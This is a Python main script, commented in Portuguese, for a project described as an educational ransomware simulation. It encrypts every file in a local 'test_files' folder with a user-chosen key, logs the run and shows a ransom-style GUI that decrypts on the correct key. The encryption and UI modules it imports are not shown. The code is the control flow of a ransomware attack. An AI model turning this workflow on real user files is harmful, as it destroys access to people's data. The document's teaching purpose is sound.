# ───────────────────────────────────────────────
# SimuLock v1.0
# Educational Ransomware Simulation
# ───────────────────────────────────────────────
#
# Descrição:
# Sistema de simulação de ransomware desenvolvido
# para fins acadêmicos. O projeto demonstra conceitos
# de criptografia, controle de execução e recuperação
# de dados em ambiente controlado.
#
# Funcionalidades:
# - Criptografia de arquivos (AES-256 GCM)
# - Descriptografia mediante chave correta
# - Interface gráfica simulando ataque
# - Controle de execução via arquivo .flag
# - Registro de logs de operação
#
# Aviso:
# Este software é exclusivamente educacional.
# Não deve ser utilizado para fins maliciosos.
#
# Autor: [m4ntonio]
# Data: [2026-04-27]
# Versão: 1.0
# ───────────────────────────────────────────────

from scanner import scan_files
from crypto import encrypt_file, decrypt_file
from logger import log
from control import already_executed, mark_executed
from ui import ransom_screen
from pathlib import Path
from getpass import getpass

TARGET = "test_files"

def main():
    if already_executed():
        print("> Sistema já executado.")
        return

    senha = getpass("> Defina a chave: ").encode()

    files = scan_files(TARGET)

    log("Início da execução")

    for f in files:
        encrypt_file(f, senha)
        log(f"Criptografado: {f}")

    mark_executed()

    # ================= UI =================

    # OPÇÃO 1 — Interface terminal (simples, fallback)
    # from ui import ransom_screen
    # user_key = ransom_screen().encode()
    #
    # if user_key == senha:
    #     locked_files = Path(TARGET).rglob("*.locked")
    #     for f in locked_files:
    #         decrypt_file(f, senha)
    #         log(f"Descriptografado: {f}")
    #     print("Arquivos recuperados")
    # else:
    #     log("Tentativa de chave incorreta")
    #     print("Chave incorreta")


    # OPÇÃO 2 — Interface gráfica (principal)
    from ui_gui import mostrar_ransom_gui

    def verificar_chave(input_key):
        if input_key.encode() == senha:
            locked_files = Path(TARGET).rglob("*.locked")
            for f in locked_files:
                decrypt_file(f, senha)
                log(f"Descriptografado: {f}")
            return True
        else:
            log("Tentativa de chave incorreta")
            return False

    mostrar_ransom_gui(verificar_chave)

if __name__ == "__main__":
    main()